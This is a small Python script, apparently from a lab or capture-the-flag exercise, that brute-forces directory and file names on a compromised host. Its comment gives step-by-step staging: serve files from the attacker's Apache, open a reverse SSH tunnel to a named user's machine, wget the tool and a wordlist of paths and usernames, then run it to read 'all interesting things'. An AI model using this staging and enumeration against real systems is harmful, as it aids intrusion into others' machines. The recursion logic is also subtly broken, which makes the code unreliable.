import os

'''
to get onto e.lindsey@192.168.101.9:
1. save this shit in /var/www/html/
2. service apache2 start
3. ssh into e.lindsey@192.168.101.9
4. ssh tunnel with shift + tilde + c --> -R (port):localhost:80
5. wget http://localhost:(port)/(this file)
6. wget http://localhost:(port)/common.txt (containing drib dictionary + usernames)
6. python (this file) --> boom, cd/cat all interesting things
'''
class finder:

	def __init__(self):
		self.path = "test/dir/"
		self.dict = "common.txt"

	def look_for_path(self, path_to_file):
		if os.path.isfile(path_to_file):
			print("*** found file:" + path_to_file)
			return False
		elif os.path.isdir(path_to_file):
			print("+++ found directory:" + path_to_file)
			return 1
		else:
			return -1

	def look_for_subdir(self, path_to_file):
		with open(self.dict) as diction:
			for line in diction:
				print(line.rstrip("\n"))
				current_path = path_to_file + line.rstrip("\n")
				print(current_path)
				if self.look_for_path(current_path) == 0:
					self.look_for_subdir(current_path + '/')


	def look_for_subdir2(self, path_to_file):
		'''shitty ass server only runs 2.7.3, so this doesn't work (╯°□°）╯︵ ┻━┻ 

			good for 2.7.12+ though if you ever need a traversal script'''
		for root, dirs, files in os.walk(path_to_file):
			for dirr in dirs:
				print("+++ found directory:", dirr)
			for file in files:
				if file.endswith(".txt") or file.endswith(""):
					print("*** found file:",os.path.join(root, file))

if __name__ == '__main__':
	fin = finder()
	fin.look_for_subdir(fin.path)
	print("DONE")
